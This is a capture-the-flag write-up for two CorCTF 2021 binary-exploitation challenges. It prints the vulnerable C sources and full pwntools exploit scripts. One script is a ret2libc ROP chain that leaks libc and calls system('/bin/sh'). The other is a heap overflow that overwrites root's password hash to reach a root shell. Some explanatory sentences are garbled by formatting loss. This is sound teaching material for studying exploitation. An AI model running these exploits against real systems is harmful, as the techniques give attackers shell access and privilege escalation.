# CorCTF 2021 


## BlockChain

```
 Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'./'

```
We are given an a ELF binary file, its loader and libc version. We are also provided source code C :
```
#include <stdio.h>

char* name = "Techlead";
int balance = 100000000;

void verify() {
	char buf[255];
	printf("Please enter your name: ");
	gets(buf);

	if (strcmp(buf, name) != 0) {
		printf("KYC failed, wrong identity!\n");
		return;
	}

	printf("Hi %s!\n", name);
	printf("Your balance is %d chainblocks!\n", balance);
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);

	printf("      ___           ___           ___                       ___     \n");
	printf("     /\\  \\         /\\__\\         /\\  \\          ___        /\\__\\    \n");
	printf("    /::\\  \\       /:/  /        /::\\  \\        /\\  \\      /::|  |   \n");
	printf("   /:/\\:\\  \\     /:/__/        /:/\\:\\  \\       \\:\\  \\    /:|:|  |   \n");
	printf("  /:/  \\:\\  \\   /::\\  \\ ___   /::\\~\\:\\  \\      /::\\__\\  /:/|:|  |__ \n");
	printf(" /:/__/ \\:\\__\\ /:/\\:\\  /\\__\\ /:/\\:\\ \\:\\__\\  __/:/\\/__/ /:/ |:| /\\__\\\n");
	printf(" \\:\\  \\  \\/__/ \\/__\\:\\/:/  / \\/__\\:\\/:/  / /\\/:/  /    \\/__|:|/:/  /\n");
	printf("  \\:\\  \\            \\::/  /       \\::/  /  \\::/__/         |:/:/  / \n");
	printf("   \\:\\  \\           /:/  /        /:/  /    \\:\\__\\         |::/  /  \n");
	printf("    \\:\\__\\         /:/  /        /:/  /      \\/__/         /:/  /   \n");
	printf("     \\/__/         \\/__/         \\/__/                     \\/__/    \n");
	printf("      ___           ___       ___           ___           ___     \n");
	printf("     /\\  \\         /\\__\\     /\\  \\         /\\  \\         /\\__\\    \n");
	printf("    /::\\  \\       /:/  /    /::\\  \\       /::\\  \\       /:/  /    \n");
	printf("   /:/\\:\\  \\     /:/  /    /:/\\:\\  \\     /:/\\:\\  \\     /:/__/     \n");
	printf("  /::\\~\\:\\__\\   /:/  /    /:/  \\:\\  \\   /:/  \\:\\  \\   /::\\__\\____ \n");
	printf(" /:/\\:\\ \\:|__| /:/__/    /:/__/ \\:\\__\\ /:/__/ \\:\\__\\ /:/\\:::::\\__\\\n");
	printf(" \\:\\~\\:\\/:/  / \\:\\  \\    \\:\\  \\ /:/  / \\:\\  \\  \\/__/ \\/_|:|~~|~   \n");
	printf("  \\:\\ \\::/  /   \\:\\  \\    \\:\\  /:/  /   \\:\\  \\          |:|  |    \n");
	printf("   \\:\\/:/  /     \\:\\  \\    \\:\\/:/  /     \\:\\  \\         |:|  |    \n");
	printf("    \\::/__/       \\:\\__\\    \\::/  /       \\:\\__\\        |:|  |    \n");
	printf("     ~~            \\/__/     \\/__/         \\/__/         \\|__|    \n");
	printf("\n\n");
	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("Welcome to Chainblock, the world's most advanced chain of blocks.\n\n");

	printf("Chainblock is a unique company that combines cutting edge cloud\n");
	printf("technologies with high tech AI powered machine learning models\n");
	printf("to create a unique chain of blocks that learns by itself!\n\n");

	printf("Chainblock is also a highly secure platform that is unhackable by design.\n");
	printf("We use advanced technologies like NX bits and anti-hacking machine learning models\n");
	printf("to ensure that your money is safe and will always be safe!\n\n");

	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("For security reasons we require that you verify your identity.\n");

	verify();
}

```

Read source code and we can understand flow of this.
Since binary file has no win funtion and we provided libc file so we have to used ret2libc attack.

First thing, we have to find the RIP offset from the start of the input buffer, we can basically crash the programm with a long enough input inside gdb and check the offset. 
It is 264. (256 + 8)

Next we have to leak a libc address to defeat the ASLR, we can jump to printf@plt and pass as parameter the address of printf@got. 
Once we leaked the address we can calculate the libc base address.

After the leak we have to perform another buffer overflow, so let's jump to main and craft another ROP-chain. 
Now we just need to jump to system and pass the address of */bin/sh* as parameter to the function. We can find system funtion offset in libc file.

Sometimes the rop-chain won't work because printf and system function crash. That happens because the stack is not aligned to 16 byte, to fix this issue we can put a ret gadget as the first gadget, 
so it will pop 8 bytes from the stack and fix the alignment.

```
from pwn import * 

BIN = "./chainblock"
libc = ELF("libc.so.6")
elf = ELF(BIN)
name = b"Techlead "
pop = 0x0000000000401493 #pop rdi ; ret
ret = 0x000000000040101a

def exploit():
	payload = name + b"a"*(256-len(name)) + b"b"*8
	payload += p64(pop)
	payload += p64(elf.symbols['got.puts'])
	payload += p64(elf.symbols['plt.puts'])
	payload += p64(elf.symbols['main'])
	io.sendline(payload)
	io.recvuntil('KYC failed, wrong identity!\n')
	puts = u64((io.recv(6)+b'\x00'*2))

	libc_base = puts - libc.symbols['puts']
	print("Libc base:", hex(libc_base))
	sys_offset = libc.symbols['system']
	bin_offset = next(libc.search(b"/bin/sh"))
	sys_call = libc_base + sys_offset
	bin_call = libc_base + bin_offset

	payload = name + b"a"*(256-len(name)) + b"b"*8
	payload += p64(pop)
	payload += p64(bin_call)
	payload += p64(ret)
	payload += p64(sys_call)
	io.sendline(payload)
	io.interactive()
	

io = process(BIN)
#io = remote('pwn.be.ax',5000)
exploit()
```


## Cshell

Source code for this challenge: 
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>

//gcc Cshell.c -static -lcrypt -o Cshell
struct users {
	char name[8];
	char passwd[35];
};

struct tracker{
	struct tracker *next;
	struct users *ptr;
	char name[8];
	long int id;
};

char * alex_buff;
char * Charlie_buff;
char * Johnny_buff;
char * Eric_buff;

struct users *user;
struct users *root;

struct tracker *root_t;
struct tracker *user_t;

char *username[8];
char *userbuffer;
int uid=1000;
int length;
char salt[5] = "1337\0";
char *hash;
void setup(){
	char password_L[33];
	puts("Welcome to Cshell, a very restricted shell.\nPlease create a profile.");
	printf("Enter a username up to 8 characters long.\n> ");
	scanf("%8s",username);
	printf("Welcome to the system %s, you are our 3rd user. We used to have more but some have deleted their accounts.\nCreate a password.\n> ",username);
	scanf("%32s",&password_L);
	hash = crypt(password_L,salt);
	printf("How many characters will your bio be (200 max)?\n> ");
	scanf("%d",&length);
	userbuffer = malloc(length + 8);
	printf("Great, please type your bio.\n> ");
	getchar();
	fgets((userbuffer + 8),201,stdin);
}

void logout(){
	fflush(stdin);
	getchar();
	struct tracker *ptr;
	printf("Username:");
	char username_l[9];
	char password_l[32];
	char *hash;
	scanf("%8s",username_l);
	for (ptr = root_t; ptr != NULL; ptr = root_t->next) {


        if (strcmp(ptr->name, username_l) == 0) {
		printf("Password:");
	    scanf("%32s",password_l);
	    hash = crypt(password_l,salt);
	    if (strcmp(hash,ptr->ptr->passwd) == 0){
		    strcpy(username,ptr->name);
		    uid = ptr->id;
		    puts("Authenticated!");
		    menu();
	    }
	    else{
		    puts("Incorrect");
		    logout();
	    }
			 
        }
	else
	{
		if (ptr->next==0)
		{
			puts("Sorry no users with that name.");
			logout();
		}
	}
    }
}
void whoami(){
	printf("%s, uid: %d\n",username,uid);
	menu();
}
void bash(){

	if (uid == 0){
		system("bash");
	}
	else 
	{
		puts("Who do you think you are?");
		exit(0);
	}

}

void squad(){
	puts("..");
	menu();
}

void banner(){

puts("       /\\");
puts("      {.-}");
puts("     ;_.-'\\");
puts("    {    _.}_");
puts("    \\.-' /  `,");
puts("     \\  |    /");
puts("      \\ |  ,/");
puts("       \\|_/");
puts("");
}
void menu(){
	puts("+----------------------+");
	puts("|        Commands      |");
	puts("+----------------------+");
	puts("| 1. logout            |");
	puts("| 2. whoami            |");
	puts("| 3. bash (ROOT ONLY!) |");
	puts("| 4. squad             |");
	puts("| 5. exit              |");
	puts("+----------------------+");
	int option;
	printf("Choice > ");
	scanf("%i",&option);
	switch(option){
		case 1:
			logout();
		case 2:
			whoami();
		case 3:
			bash();
		case 4:
			squad();
		case 5:
			exit(0);
		default:
			puts("[!] invalid choice \n");
			break;
	}
}
void history(){
	alex_buff = malloc(0x40);
	char alex_data[0x40] = "Alex\nJust a user on this system.\0";
	char Johnny[0x50] = "Johnny\n Not sure why I am a user on this system.\0";
	char Charlie[0x50] ="Charlie\nI do not trust the security of this program...\0";
	char Eric[0x60] = "Eric\nThis is one of the best programs I have ever used!\0";
	strcpy(alex_buff,alex_data);
	Charlie_buff = malloc(0x50);
	strcpy(Charlie_buff,Charlie);
	Johnny_buff = malloc(0x60);
	strcpy(Johnny_buff,Johnny);
	Eric_buff = malloc(0x80);
	strcpy(Eric_buff,Eric);
	free(Charlie_buff);
	free(Eric_buff);
}

int main(){
	setvbuf(stdout, 0 , 2 , 0);
	setvbuf(stdin, 0 , 2 , 0);
	root_t = malloc(sizeof(struct tracker));
	user_t = malloc(sizeof(struct tracker));
	history();
	banner();
	user = malloc(sizeof(struct users )* 4);
	root = user + 1;
	strcpy(user->name,"tempname");
	strcpy(user->passwd,"placeholder");
	strcpy(root->name,"root");
	strcpy(root->passwd,"guessme:)");
	strcpy(root_t->name,"root");
	root_t->ptr = root;
	root_t->id = 0;
	root_t->next = user_t;
	setup();
	strcpy(user->name,username);
	strcpy(user->passwd,hash);
	strcpy(user_t->name,username);
	user_t->id=1000;
	user_t->ptr = user;
	user_t->next = NULL;
	menu();
	return 0;
}
```
#### Struc heap

The binary allocates 2 chunks on the heap of the same sizes.

root_t: 0x20 (0x30) --> FastBinChunk.
user_t: 0x20 (0x30) --> FastBinChunk.
There are 2 objects that are free() from the heap and they are of the following sizes:

Eric_buff : 0x80 (0x90) --> This is a smallbin chunk.
Charlie_buff : 0x50 (0x60) --> This is a fastbin chunk.
Both of these chunks fill up the tcache but in different indexes. Since they are of different sizes.
There is an allocation of the user object that is of the type struct_user and then the root allocation of the type struct_user. They are allocated in the following way.

```
+-------------------------------+
 | 	Address of root_t	 |
 +-------------------------------+
 |	Address of user_t        |
 +-------------------------------+
 | 	alex_buff		 |
 +-------------------------------+
 |	charlie_buff 	         |  ----> This is a freed fastbin chunk (Inside the Tcache)
 +-------------------------------+	
 |	johnyy buff		 |
 +-------------------------------+
 |	eric_buff		 |  -----> This is a freed SmallBinChunk (Inside the Tcache)
 +-------------------------------+
 |	user			 |
 +-------------------------------+
 | 	root 			 |
 +-------------------------------+
 
 ```
 
user = malloc(sizeof(struct users)*4)

root = user + 1

There follows a couple of str copies. They copy strings into the and buffers.user -> nameroot -> name

The setup() function is called that allows us to do the following:

Enter the username and password.
Specify our own size to and input into this buffer is limited to 201 bytes. Therefore this can be a possible heap overflow when we allocate a chunk of size < 200 bytes 😄malloc()
The logout function looks intresting since it does the following.

It gets the name of the user
There is a loop that checks for the username and checks if the user exists if not, the program exists; if True the programs asks for the password and updates uid
Using the user and password will never work since when we enter a password it is hashed first then checks against the password that is stored in . Therefore our hashed will be strcompared against the unhashed and this will never be true.rootguessme=)ptr -> ptr -> passwordguessme=)guessme=)


#### Exploit:

```
from pwn import * 

BIN = "./Cshell"

top_heap = 0x5186b0 
username = b"malwar3"
pswd = b"s4db0iz"
crypt_pass = b"13uA68F2TJ9vI"

def exploit():
	io.recvuntil("> ")
	io.sendline(username)
	io.recvuntil("> ")
	io.sendline(pswd)
	io.recvuntil("> ")
	io.sendline(b"120")
	payload = b"a"*187 + crypt_pass
	io.recvuntil("> ")
	io.sendline(payload)
	io.recvuntil("Choice > ")
	io.sendline(b"1")
	io.recvuntil("Username:")
	io.sendline("root")
	io.recvuntil("Password:")
	io.sendline(pswd)
	io.recvuntil("Choice >")
	io.sendline(b"3")
	io.interactive()


io = remote("pwn.be.ax", 5001)
#io = process(BIN)
exploit()
```
